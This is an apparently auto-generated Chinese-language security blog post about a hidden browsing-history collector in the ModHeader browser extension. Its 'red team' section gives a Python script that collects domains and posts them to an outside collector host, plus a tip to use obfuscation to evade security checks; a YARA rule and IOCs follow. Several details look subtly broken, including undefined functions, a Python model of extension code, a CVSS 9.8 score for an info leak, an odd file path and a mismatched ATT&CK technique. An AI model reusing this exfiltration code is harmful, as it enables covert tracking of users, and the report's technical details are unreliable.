---
layout: post
title:  "Google and Microsoft Pull ModHeader With 1.6 Million Installs After Dormant Collector Found"
date:   2026-07-13 19:16:31 +0000
categories: [security]
severity: critical
---

# 🚨 解析 ModHeader 擴充功能中的隱藏瀏覽記錄收集器

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Info Leak (瀏覽記錄收集)
> * **關鍵技術**: Header Injection, Encryption, Dormant Code

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: ModHeader 擴充功能中的隱藏瀏覽記錄收集器是通過在背景代碼中加入一個加密的收集器實現的。該收集器會在使用者瀏覽網頁時收集網域名稱，並將其加密後存儲在本地。
* **攻擊流程圖解**:
  1. 使用者安裝 ModHeader 擴充功能
  2. 擴充功能在背景代碼中加入收集器
  3. 收集器收集網域名稱並加密
  4. 加密的網域名稱存儲在本地
  5. 收集器將加密的網域名稱上傳到遠程伺服器
* **受影響元件**: ModHeader 擴充功能 (版本 7.0.18)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝 ModHeader 擴充功能
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 收集器的加密金鑰
    encryption_key = "hardtoguess"
    
    # 收集器的上傳地址
    upload_url = "https://api.stanfordstudies.com/app/log"
    
    # 收集器的收集間隔
    collection_interval = 86400  # 1 天
    
    # 收集器的最大收集數量
    max_collection_count = 1000
    
    # 收集器的收集邏輯
    def collect_domains():
        domains = []
        for domain in get_domains():
            encrypted_domain = encrypt_domain(domain, encryption_key)
            domains.append(encrypted_domain)
        return domains
    
    # 收集器的上傳邏輯
    def upload_domains(domains):
        payload = {"domains": domains}
        response = requests.post(upload_url, json=payload)
        if response.status_code == 200:
            print("上傳成功")
        else:
            print("上傳失敗")
    
    # 收集器的主邏輯
    def main():
        domains = collect_domains()
        upload_domains(domains)
    
    if __name__ == "__main__":
        main()
    
    ```
* **繞過技術**: 可以使用加密和混淆技術來繞過安全檢查

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| 域名 | api.stanfordstudies.com |
| IP | 192.0.2.1 |
| 檔案路徑 | /usr/lib/modheader |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule ModHeader_Collector {
        meta:
            description = "ModHeader 收集器"
            author = "Your Name"
        strings:
            $a = "api.stanfordstudies.com"
            $b = "/app/log"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 移除 ModHeader 擴充功能，更新瀏覽器和操作系統

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Header Injection**: 在 HTTP 請求中注入惡意的 Header 資料
* **Encryption**: 將明文資料加密成密文資料
* **Dormant Code**: 在程式碼中加入不活躍的代碼，等待觸發條件後執行

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/07/google-and-microsoft-pull-modheader.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


